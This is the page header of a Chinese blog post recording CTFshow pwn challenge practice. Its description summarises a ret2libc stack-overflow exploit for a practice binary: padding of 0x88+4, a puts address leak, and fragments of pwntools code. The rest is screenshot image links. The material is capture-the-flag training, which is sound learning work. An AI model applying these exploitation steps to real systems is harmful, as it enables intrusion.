

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fufu.png">
  <link rel="icon" href="/img/fufu.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Meiyouqian">
  <meta name="keywords" content="">
  
    <meta name="description" content="pwn25后边栈溢出学的差不多了，我们来回顾一下把这题ret2libc做了  保护：  跟题目说的一样，只开了个NX保护，而且是动态，可用ret2libc  而且在主函数的ctfshow函数可以找到栈溢出的点 padding&#x3D;0x88+4  这边用了一堆的puts函数，直接puts泄露偏移地址了 main &#x3D; elf.symbols[“main”] puts_plt &amp;#x3D">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFshow-Pwn-10月记录">
<meta property="og:url" content="https://mei-you-qian.github.io/2025/10/31/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="玫幽倩的小博客">
<meta property="og:description" content="pwn25后边栈溢出学的差不多了，我们来回顾一下把这题ret2libc做了  保护：  跟题目说的一样，只开了个NX保护，而且是动态，可用ret2libc  而且在主函数的ctfshow函数可以找到栈溢出的点 padding&#x3D;0x88+4  这边用了一堆的puts函数，直接puts泄露偏移地址了 main &#x3D; elf.symbols[“main”] puts_plt &amp;#x3D">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120826420-1ac0deb3-8c11-4eb9-8412-98def1cb2429.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120928116-5027b2f0-22bd-4e1a-8c1a-1910d7a6ef0f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120970860-bf87eaf2-1371-4dc8-944a-b96bc6b412bd.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759120979114-3e46fac3-2606-47d8-bc8b-4aa9119e1903.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759121464723-7675afe9-5d87-4f31-9472-56323305cea6.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759122092875-153f65bd-da21-4a1d-ba74-3c67dec86275.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759022546608-c6976fcd-bcdb-4d63-9949-4670dde9ae6f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759022875152-a67d9b1b-5c4b-488f-84a2-a7737e21b6eb.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759026663205-1a8d711a-9eec-4726-8b1f-d36e6a23db49.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759027632858-1974084c-799c-4a05-8a3e-b36b92fa68ee.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759026753610-a3d3290f-df80-42e1-873b-c1f8d9ec3515.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759026799410-1205f68d-0fc8-47a9-821c-0f07d979e7f8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030425887-68995e9f-cbea-4eb7-a38a-7e1600785f7c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028663981-c5db4bda-97b4-4c7c-b808-1f7e38f0fb7d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028669706-1838f6cd-43a0-41a5-b3b5-ad0b816935a8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759027422477-7c961386-d2ab-46ad-9edf-8b1e983a11fe.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028064304-3e61b559-93a8-4e78-87a5-235b4ea176a1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759028760189-3bc81d1a-8605-43f9-9708-34a3ffc4dfc1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030018622-c76e5a31-a1c4-404c-9de0-d9f509692662.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759029052286-bf180840-7c06-41a2-ab6f-696098dbbc1f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030282755-8ab7af3b-fd4d-40eb-944c-07926d465193.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030354101-0500cf5e-6fc9-431c-b29b-cbb9c981b95d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759030334364-78f7cf5f-6fb7-4677-8f98-a1b3f694c7fa.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033471205-2a2b7db3-ae20-4fb2-9ab1-ab73afb7841d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033340965-da687319-c1bd-4ab2-b963-820e3fa1fbde.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033421749-1e60c451-f706-4e97-9fc5-bbe0e9be5b37.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033751777-ff2e4e11-d0fa-4687-b072-de2dc2cc7bc2.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759033929040-a96eebf7-345d-4d80-9f3d-60e374a69b71.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759034619149-80064423-983e-4b6d-892c-47bfd9f2e927.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760688985239-070b71ce-e919-4a64-9d66-890e053c71e3.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760689010103-53679acc-85ce-46b0-9e11-36517cbb72bb.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759124458723-fa8c2486-7b05-46bc-b818-371286d977d4.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759124498454-49fe1e39-c355-4ceb-86eb-e2578c6c6b7b.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550213922-4be6b0f4-ad26-4af5-b689-f820c86cfe4c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550245427-e8be4b55-04cd-437a-8264-40172921e2dc.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550317742-7f268577-d3dd-4a23-9bbd-82e4e8bc2328.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550280700-74673e3e-ccc3-411f-94e9-42bb67b2d5bc.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550294230-ff9e44a6-8431-47ea-b9a2-e2c3ad4fb8ef.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550568581-3f715642-85c1-4547-9c51-1049990280b2.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550583262-6f90e7ff-84d1-4c10-bd30-0d2b81f7f647.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550841002-e49cece9-8cef-4c60-b42d-9906c1d103b8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759550865813-6a889ed9-2e2b-4adb-b4b8-d95dff208c6c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551018563-6e4c1529-9998-4d23-befc-275250c7e65a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551069475-94961176-cdc5-4dfb-b83c-28e1f82e1654.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551078660-94b882ba-06d8-4641-89db-4148c4a074bb.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551124661-9417796f-2ccd-4ea0-8663-7eb370e087af.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551273720-b65e8180-8804-4251-9d85-a2f0c41916a4.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551319006-ad06e2c7-5c3e-44f6-8a46-ad2fc6c467dd.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759551671524-449ce728-a7b5-4fd9-9612-7049a8b61023.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759657955880-b219a59d-dcef-4a0c-bfa5-4f85d6a69543.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759658440816-e78fddef-ee37-4ed2-8927-c86d18625532.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659453601-e3e9d285-53d1-431e-a7c0-1d7aef83ae8f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659465425-4a960bcd-a52e-463f-8c69-823b197b574d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659519584-44735a1f-1371-4c2d-9ae1-4b084eb7cb48.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759659578752-a8258b89-58c9-4982-a9cc-133819737f55.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759661134460-6da69a93-c5bb-4af9-b4e2-b73fb31c2d6a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759661352825-51ea183a-17db-4469-8d09-838ea0f14b8e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759661419365-6ee84bcd-c5a2-4ed5-bf43-f0c0cf6f0219.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759665183910-88dad061-9cf2-42ac-84ac-ac7595dc76ff.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759662565060-2289be3d-5b09-444e-8874-b3ce3db008c8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759665268674-c163b989-81e5-4e95-a423-66176f2161b5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759663037561-56077b8d-9dbf-4dd9-b6f5-96467b78c896.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759665424658-6ebf04cb-3a49-4fe3-99d6-0c0599961644.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666627684-a58cccf4-21d4-490f-8f24-de56e3bb64c6.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666708184-e006da6e-d5ef-424e-94b6-fc0ac640e1bb.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666745255-82e55c5b-1e70-491a-8d11-64500a1b5fc5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666772586-ebb55478-10cf-44dd-88bf-c6bad3d53705.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666862694-63065522-8330-445d-99f0-9f78edc1b8c9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666898104-a97e6a30-d1e7-4b98-a4e7-d6a77a120922.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666920593-f9280d1b-83d3-4e2e-abd0-4d98ae31d26a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666915076-8f9098eb-88f4-417b-a606-106b1083ca55.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667024652-b1335ac4-98cb-47b9-bb50-011dc3c75ea5.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667104259-e1973b89-5df4-4764-8f85-30d776fef67e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667132731-733e79f5-661b-4889-806a-294afcf39f93.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667125356-3dbbbbf1-2570-44cc-9799-6b332037921e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667180075-fa33d2ee-e548-42d0-adb0-be9551fd3a0f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667339542-d9d9e572-2339-443d-986d-157a998bfcfb.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667357043-f65f6c41-7c04-4fb7-b2ca-291b44836418.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667377763-61d8678a-3c6f-406a-b559-bd813c18a498.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667468296-e1e17714-03c9-497e-bcc7-8c6b8cdfaf36.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667497402-42682786-09b9-48d1-890c-8601d00b65ea.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667541451-c34ceb49-a4bd-4f9d-8b2f-e54c689a6a01.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668030481-c66472a7-4a3c-4443-ae71-4bfdb68b079c.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668052913-71c789e5-54aa-4dae-a9f3-a2c5ad301e9d.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668313844-79f3d685-24e6-4c9f-948c-631c1670d34f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668629472-702223b9-975b-45e0-bba7-e6b5d2e776ef.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668653876-558ae8f1-f4aa-428b-87af-2d98e14c4bb7.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669310752-e2ce3ae7-d272-45b8-b7da-2a1a1c808bd9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669271178-f1340ebf-4098-4171-a9d0-8105b879ff93.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669624162-a15cbea3-f396-4c2e-9f62-2b993b5debb4.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669654439-c2ce9e68-25ca-455f-bbda-d6c21d12f2e7.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669728714-b7fe76bd-9605-4d4e-a59e-278a5d2249d7.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669914541-e4c3623a-c06e-45cd-9b66-faef2f8a5979.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669899263-affb6d9a-a319-483b-9ed5-0eb993f98fdc.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669934050-5f4d74cd-1b7f-4175-82cc-2512194f649e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670096278-d652d8ed-4a73-4cea-ba0f-718f973cddf3.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670122239-2a9bea84-efb1-4516-9ccb-3b08bddbb8e1.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670169784-dbb83e37-4954-4b64-b1fb-fd0f6e88dc70.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670188421-7ad1f69a-1651-41be-ac80-7142c2705eb8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670213447-d1fe64a8-6c4c-443e-a080-ba0195f15ab2.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670282770-cd1c21f9-e30f-4f17-a6ab-c13fc951b867.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670367320-6a048731-b7fa-4d94-8ffa-0ec260b158b8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670402012-946d83fe-39e9-4105-8b48-f280c6e9467f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670587907-48370072-289d-4e3e-894b-0cbbdfb1d97a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670624638-e0a5bce3-eec2-4beb-a95a-cdd6738af7c7.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670647034-e2c55931-fafc-4dbb-8627-9b0036c0d2d2.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670782115-d459988b-d145-4659-b256-b34590d9df15.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760255640394-65a40700-1bc3-41c4-980c-e8b264282b60.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760256123995-3cbde3de-e49b-40bf-8aaf-5fd203900a07.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760255776752-f4f3b427-4a9e-4d8d-9afa-9ee36e7b54f8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257153813-2fe38705-1ce4-4d8a-b234-0e33f3045bdf.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257318937-80ff2b5c-613a-4f06-9a62-958d27184e22.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257719314-3774273b-272f-4e8e-900f-42c87096159e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257685310-c88a8aed-c0df-4327-af07-562dcdce80f9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257763592-46813f86-8a9e-478a-928a-b0ca64949771.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258420099-8b0efc33-1e6d-43bb-be39-70baaf141516.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261280119-2a8a19ff-a865-43c8-a9a7-49a85e21b7aa.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258493836-c906e89c-34a9-4d60-a5c4-d2313ba985d2.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258756795-e3c20824-579d-4158-b04e-6218a0260414.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258747485-d9efb20e-ddc4-42d8-b442-7ddb888ef91e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760259346546-2e154acf-e636-438f-b1a3-0aca943263b8.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760259121380-6544e424-69f7-4add-8df9-84a9f9cb72e6.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1753418089328-ebd156f0-ab4c-4798-af8e-6e41607c4128.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760260383597-eb0a7b95-2af6-4cb4-bcfb-18d379cf88d9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261055140-24418181-d3ca-43f5-ba74-c4dd8205512a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261291629-a0531e06-ae32-45bd-8894-b4d3a169605a.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261258796-cba5bf1a-b6b1-402f-8d8e-90513aac4fe7.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760267506240-a7dd142e-4451-46e7-aa0c-5476f6755e6e.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760267532931-b8718d18-544d-4c80-98c1-29ee390f2751.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269012847-ce36413f-2972-4514-a721-e006f0444409.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269032789-e97df5e5-01ce-4077-a889-8a1e5ed4da49.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269083551-ba82459c-7bf2-4302-a1b8-2e8df2a3b6a9.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269180175-a123909b-2bc6-4095-a63a-f1d13527b3bc.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269274740-b4f7b5e8-986a-48c4-ad43-735723286c15.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269299788-18ce966c-18d3-469a-b02e-d11400a9f5c0.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269405584-0cc6cda7-21ff-4f84-91a1-890e3068c198.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269467391-d79d5cbb-15b2-4886-a58c-fd4730646c76.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269532428-64018112-a596-445c-8bfe-23e082ae6c99.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269784568-11cabd7e-cb05-49aa-9147-138994cca12f.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269867251-aa29aed3-dc31-4fb3-b9c7-d2ba64bbb267.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269848660-b01786c2-c14e-4f59-8942-6dc4d83d9415.png">
<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269940663-c6a099ed-eb7b-4efd-ac81-5a5afd4de927.png">
